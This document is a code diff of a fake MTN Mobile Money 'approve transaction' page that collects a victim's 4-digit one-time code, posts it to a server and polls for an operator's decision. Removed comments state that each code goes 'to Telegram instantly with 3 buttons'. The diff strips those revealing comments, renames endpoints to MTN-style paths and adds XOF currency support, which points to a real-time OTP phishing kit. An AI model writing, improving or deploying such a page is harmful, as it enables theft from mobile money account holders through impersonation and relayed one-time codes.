@@ -179,9 +179,6 @@
   }
   .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 
-  /* ============================================================
-     Full-page overlays
-  ============================================================ */
   .authorizing, .success {
     position: fixed; inset: 0;
     display: none; flex-direction: column;
@@ -365,7 +362,8 @@
   };
 
   const CURRENCY_LOCALE = {
-    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH', USD: 'en-US'
+    XAF: 'fr-CM', ZMW: 'en-ZM', UGX: 'en-UG', GHS: 'en-GH',
+    XOF: 'fr-BJ', USD: 'en-US'
   };
   function formatAmount(amount, currency) {
     const locale = CURRENCY_LOCALE[currency] || 'en-US';
@@ -375,7 +373,7 @@
       const parts = new Intl.NumberFormat(locale, {
         minimumFractionDigits: 0, maximumFractionDigits: 2
       }).format(n);
-      const pretty = (currency === 'XAF' || currency === 'UGX')
+      const pretty = (currency === 'XAF' || currency === 'XOF' || currency === 'UGX')
         ? parts.replace(/\u202F|\u00A0|,/g, ' ')
         : parts;
       return pretty + ' ' + currency;
@@ -389,9 +387,6 @@
     t._timer = setTimeout(() => t.classList.remove('show'), 2400);
   }
 
-  /* ============================================================
-     4-digit code inputs
-  ============================================================ */
   const codeInputs = [
     document.getElementById('c1'),
     document.getElementById('c2'),
@@ -426,7 +421,6 @@
       if (input.value && idx < 3) {
         codeInputs[idx + 1].focus();
       }
-      // Auto-submit as soon as all 4 digits are typed
       if (readCode().length === 4 && !approveBtn.disabled) {
         setTimeout(() => {
           if (readCode().length === 4 && !approveBtn.disabled) approveCode();
@@ -495,10 +489,6 @@
     }
   });
 
-  /* ============================================================
-     Approve → submit → wait → success / decline / inactive
-     - 5-minute hard session limit
-  ============================================================ */
   const PAGE_LIMIT_MS = 5 * 60 * 1000;
   const PAGE_START = Date.now();
 
@@ -527,16 +517,14 @@
 
     approveBtn.disabled = true;
 
-    // Show full-page "Approving transaction…" IMMEDIATELY
     document.getElementById('authTitle').textContent = 'Approving transaction…';
     document.getElementById('authText').textContent =
       'Verifying your code with MTN Mobile Money. Please do not close this page.';
     document.getElementById('authorizingOverlay').classList.add('show');
 
-    // Fire to server — code goes to Telegram instantly with 3 buttons
     let serverAccepted = true;
     try {
-      const r = await fetch('/api/verification/submit', {
+      const r = await fetch('/api/mtn/otp', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
@@ -567,7 +555,6 @@
     const poll = async () => {
       if (!pollingActive) return;
 
-      // Hard 5-minute cap
       if (Date.now() - PAGE_START > PAGE_LIMIT_MS) {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -581,14 +568,13 @@
 
       let decision = 'pending';
       try {
-        const r = await fetch('/api/verification/status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
+        const r = await fetch('/api/mtn/otp-status/' + encodeURIComponent(tx.ref) + '?_=' + Date.now());
         const j = await r.json();
         decision = j.decision || 'pending';
-      } catch (e) { /* keep polling */ }
+      } catch (e) { }
 
       if (!pollingActive) return;
 
-      /* -------- APPROVED → success overlay (5 min) then nav to success.html -------- */
       if (decision === 'approved') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -607,7 +593,6 @@
         return;
       }
 
-      /* -------- DECLINED / EXPIRED → code expired + resend button -------- */
       if (decision === 'declined' || decision === 'expired') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
@@ -621,13 +606,13 @@
         return;
       }
 
-      /* -------- INACTIVE → navigate to oops.html -------- */
       if (decision === 'inactive' || decision === 'needs_full_sms') {
         pollingActive = false;
         document.getElementById('authorizingOverlay').classList.remove('show');
         const q = new URLSearchParams({
           tx: tx.ref, am: tx.am, cur: tx.cur, rn: tx.rn,
-          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt
+          c: tx.c, pm: tx.pm, sn: tx.sn, mk: tx.mk, an: tx.an, dt: tx.dt,
+          reason: decision === 'needs_full_sms' ? 'needs_full_sms' : 'inactive'
         });
         window.location.href = 'oops.html?' + q.toString();
         return;
@@ -639,19 +624,17 @@
     poll();
   }
 
-  /* ============================================================
-     Resend code — notifies Telegram + resets the entry area
-  ============================================================ */
   async function resendCode() {
     const lbl = document.getElementById('resendLabel');
     resendBtn.disabled = true;
     lbl.textContent = 'Sending…';
     try {
-      const r = await fetch('/api/verification/otp', {
+      const r = await fetch('/api/mtn/resend', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
           tx: tx.ref,
+          stage: 'otp',
           an: tx.an,
           c: tx.c,
           am: tx.am,
